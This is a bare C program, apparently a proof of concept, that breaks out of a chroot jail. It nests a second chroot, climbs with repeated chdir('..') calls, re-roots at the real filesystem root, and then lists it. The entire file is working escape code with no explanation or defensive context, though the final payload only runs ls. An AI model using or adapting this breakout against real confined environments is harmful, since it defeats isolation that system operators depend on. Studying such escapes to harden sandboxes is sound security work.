#include <stdio.h>
#include <sys/stat.h>
#include <unistd.h>

int main(void)
{
	mkdir("/esc", 0755);
	chroot("/esc");

	for (int i = 0; i < 64; i++)
		chdir("..");

	chroot(".");
	chdir("/");
	execlp("ls", "ls", "/", NULL);
	return 1;
}
